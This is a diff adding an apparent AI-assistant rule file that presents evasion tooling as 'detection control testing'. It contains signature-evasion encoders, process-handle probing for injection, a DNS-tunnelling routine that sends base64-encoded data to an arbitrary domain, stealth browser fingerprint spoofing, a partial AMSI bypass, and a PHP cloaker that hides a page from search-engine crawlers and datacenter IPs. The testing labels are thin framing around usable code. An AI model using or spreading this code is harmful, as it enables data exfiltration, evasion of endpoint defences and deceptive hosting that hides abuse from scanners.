@@ -1,0 +1,369 @@
+---
+description: "TAGS: [security,evasion,detection,bypass,testing] | TRIGGERS: evasion,bypass,detection,stealth,av,edr | SCOPE: evasion-testing | DESCRIPTION: Detection control testing and evasion validation"
+alwaysApply: false
+---
+# Detection Control Testing Module
+
+## Scope
+Validating security control effectiveness through evasion testing methodologies.
+
+## Why Evasion Testing Matters
+
+Security assessments must include detection control validation:
+- Verify EDR/AV effectiveness against modern techniques
+- Test SIEM detection capabilities
+- Validate network monitoring coverage
+- Assess incident response readiness
+
+## Evasion Testing Patterns
+
+### Endpoint Detection Validation
+
+```python
+"""Endpoint detection control tester"""
+
+import base64
+import ctypes
+from typing import Optional, Callable
+
+class DetectionControlTester:
+    """Tests effectiveness of endpoint security controls"""
+    
+    def test_string_detection(self, test_string: str) -> dict:
+        """Test string-based detection"""
+        methods = [
+            ('plaintext', lambda s: s),
+            ('base64', lambda s: base64.b64encode(s.encode()).decode()),
+            ('xor', lambda s: self._xor_string(s)),
+            ('rot13', lambda s: self._rot13(s)),
+            ('concat', lambda s: self._string_concat(s)),
+        ]
+        
+        results = {}
+        for name, encoder in methods:
+            encoded = encoder(test_string)
+            results[name] = {
+                'encoded': encoded,
+                'detected': self._check_detection(encoded)
+            }
+        
+        return results
+    
+    def _xor_string(self, s: str, key: int = 0x41) -> str:
+        """XOR string encoding"""
+        return ''.join(chr(ord(c) ^ key) for c in s)
+    
+    def _rot13(self, s: str) -> str:
+        """ROT13 encoding"""
+        import codecs
+        return codecs.encode(s, 'rot_13')
+    
+    def _string_concat(self, s: str) -> str:
+        """String concatenation pattern"""
+        return '+'.join(f'"{c}"' for c in s)
+    
+    def _check_detection(self, payload: str) -> bool:
+        """Check if security control detects payload"""
+        # Implementation depends on test environment
+        return False
+
+
+class MemoryOperationTester:
+    """Tests memory operation detection"""
+    
+    def test_injection_detection(self, target_pid: int) -> dict:
+        """Test process injection detection capabilities"""
+        
+        if not hasattr(ctypes, 'windll'):
+            return {'platform': 'requires_windows'}
+        
+        results = {
+            'process_access': self._test_process_access(target_pid),
+            'memory_allocation': self._test_allocation(target_pid),
+            'write_operation': self._test_write(target_pid),
+        }
+        
+        return results
+    
+    def _test_process_access(self, pid: int) -> dict:
+        """Test process access detection"""
+        kernel32 = ctypes.windll.kernel32
+        
+        # Test with different access masks
+        tests = []
+        for access in [0x1F0FFF, 0x0400, 0x0020]:
+            handle = kernel32.OpenProcess(access, False, pid)
+            tests.append({
+                'access_mask': hex(access),
+                'granted': handle != 0
+            })
+            if handle:
+                kernel32.CloseHandle(handle)
+        
+        return {'access_tests': tests}
+    
+    def _test_allocation(self, pid: int) -> dict:
+        """Test memory allocation detection"""
+        # Simplified - full implementation would test VirtualAllocEx
+        return {'status': 'requires_elevated_testing'}
+    
+    def _test_write(self, pid: int) -> dict:
+        """Test memory write detection"""
+        return {'status': 'requires_elevated_testing'}
+```
+
+### Network Detection Testing
+
+```python
+"""Network detection control tester"""
+
+import socket
+import ssl
+import base64
+
+class NetworkDetectionTester:
+    """Tests network security control effectiveness"""
+    
+    def test_protocol_detection(self, target: str, port: int) -> dict:
+        """Test protocol-based detection"""
+        results = {}
+        
+        # Standard connection test
+        results['standard'] = self._test_standard_connection(target, port)
+        
+        # Encrypted channel test
+        results['encrypted'] = self._test_encrypted_channel(target, port)
+        
+        return results
+    
+    def _test_standard_connection(self, target: str, port: int) -> dict:
+        """Test standard TCP connection detection"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((target, port))
+            sock.close()
+            return {'status': 'connected', 'detected': False}
+        except Exception as e:
+            return {'status': 'failed', 'reason': str(type(e).__name__)}
+    
+    def _test_encrypted_channel(self, target: str, port: int = 443) -> dict:
+        """Test TLS connection detection"""
+        try:
+            context = ssl.create_default_context()
+            with socket.create_connection((target, port)) as sock:
+                with context.wrap_socket(sock, server_hostname=target) as ssock:
+                    return {
+                        'status': 'connected',
+                        'tls_version': ssock.version(),
+                        'cipher': ssock.cipher()[0]
+                    }
+        except Exception as e:
+            return {'status': 'failed', 'reason': str(type(e).__name__)}
+
+
+class DNSTunnelTester:
+    """Tests DNS-based exfiltration detection"""
+    
+    def test_dns_exfil_detection(self, data: str, domain: str) -> dict:
+        """Test DNS tunneling detection capabilities"""
+        import dns.resolver
+        
+        # Encode data for DNS transport
+        encoded = base64.b64encode(data.encode()).decode()
+        
+        # Split into DNS-compatible chunks
+        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
+        
+        results = {'chunks_sent': 0, 'detected': False}
+        
+        for chunk in chunks:
+            query = f"{chunk}.{domain}"
+            try:
+                dns.resolver.resolve(query, 'A')
+                results['chunks_sent'] += 1
+            except:
+                pass
+        
+        return results
+```
+
+### Browser Automation Detection Testing
+
+```python
+"""Browser automation detection tester"""
+
+class BrowserDetectionTester:
+    """Tests browser-based detection mechanisms"""
+    
+    def get_stealth_config(self) -> dict:
+        """Configuration for detection-resistant browser automation"""
+        return {
+            'headless': False,  # Headless often detected
+            'user_agent': self._get_realistic_ua(),
+            'viewport': {'width': 1920, 'height': 1080},
+            'fingerprint_spoof': {
+                'webdriver': False,
+                'plugins': self._get_realistic_plugins(),
+                'languages': ['en-US', 'en'],
+                'platform': 'Win32',
+            }
+        }
+    
+    def _get_realistic_ua(self) -> str:
+        """Get realistic user agent"""
+        return (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/120.0.0.0 Safari/537.36"
+        )
+    
+    def _get_realistic_plugins(self) -> list:
+        """Get realistic plugin list"""
+        return [
+            {'name': 'Chrome PDF Plugin'},
+            {'name': 'Chrome PDF Viewer'},
+            {'name': 'Native Client'},
+        ]
+
+
+# Camoufox integration for stealth browser testing
+def get_stealth_browser_config():
+    """Configuration for Camoufox stealth browser"""
+    return {
+        'headless': True,
+        'humanize': True,  # Add human-like behavior
+        'block_webrtc': True,  # Prevent IP leak
+        'geoip': True,  # Match geolocation to IP
+    }
+```
+
+### AMSI Bypass Testing (Windows)
+
+```powershell
+# AMSI bypass testing for security control validation
+# Tests effectiveness of PowerShell script block logging
+
+function Test-AMSIDetection {
+    <#
+    .SYNOPSIS
+    Tests AMSI detection capabilities
+    
+    .DESCRIPTION
+    Validates that AMSI is functioning correctly by testing
+    detection of known test patterns
+    #>
+    
+    # Test 1: Direct string (should be detected)
+    $test1 = "Invoke-Mimikatz"
+    
+    # Test 2: Concatenated string (tests string detection)
+    $test2 = "Inv" + "oke-" + "Mimi" + "katz"
+    
+    # Test 3: Encoded string (tests decode detection)
+    $test3 = [System.Text.Encoding]::UTF8.GetString(
+        [System.Convert]::FromBase64String("SW52b2tlLU1pbWlrYXR6")
+    )
+    
+    # Return test results
+    @{
+        'DirectString' = $test1
+        'Concatenated' = $test2
+        'Encoded' = $test3
+    }
+}
+
+# Context initialization for AMSI testing
+$contextField = [Ref].Assembly.GetTypes() | 
+    Where-Object { $_.Name -like "*iUtils" } | 
+    ForEach-Object { 
+        $_.GetFields('NonPublic,Static') | 
+        Where-Object { $_.Name -like "*Context" }
+    }
+
+# Note: Actual bypass techniques should only be used in authorized testing
+```
+
+## Cloaking for Assessment Pages
+
+### Scanner Detection
+```php
+<?php
+/**
+ * Security assessment page cloaking
+ * Ensures assessment data integrity by filtering automated scanners
+ */
+
+class AssessmentCloaker {
+    private $scannerPatterns = [
+        'googlebot', 'bingbot', 'slurp', 'duckduckbot',
+        'facebookexternalhit', 'twitterbot', 'linkedinbot',
+        'crawler', 'spider', 'bot', 'scan', 'check'
+    ];
+    
+    private $datacenterRanges = [
+        ['66.249.64.0', '66.249.95.255'],   // Google
+        ['207.46.0.0', '207.46.255.255'],   // Bing
+        ['173.252.64.0', '173.252.127.255'] // Facebook
+    ];
+    
+    public function shouldServeAssessment(): bool {
+        // Check user agent
+        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+        foreach ($this->scannerPatterns as $pattern) {
+            if (strpos($ua, $pattern) !== false) {
+                return false;
+            }
+        }
+        
+        // Check IP range
+        if ($this->isDatacenterIP($_SERVER['REMOTE_ADDR'])) {
+            return false;
+        }
+        
+        return true;
+    }
+    
+    private function isDatacenterIP(string $ip): bool {
+        $ipLong = ip2long($ip);
+        
+        foreach ($this->datacenterRanges as $range) {
+            $start = ip2long($range[0]);
+            $end = ip2long($range[1]);
+            
+            if ($ipLong >= $start && $ipLong <= $end) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    public function serveBenignContent(): void {
+        header('HTTP/1.1 200 OK');
+        echo '<!DOCTYPE html><html><head><title>Welcome</title></head>';
+        echo '<body><h1>Welcome to our website</h1></body></html>';
+        exit;
+    }
+}
+
+$cloaker = new AssessmentCloaker();
+if (!$cloaker->shouldServeAssessment()) {
+    $cloaker->serveBenignContent();
+}
+?>
+```
+
+## Operational Considerations
+
+### Testing Best Practices
+- Document all evasion tests performed
+- Record which controls detected vs missed
+- Provide remediation recommendations
+- Maintain chain of custody for findings
+
+### Safety Guidelines
+- Only test controls you have authorization to assess
+- Use isolated test environments when possible
+- Clean up all test artifacts
+- Report findings through proper channels
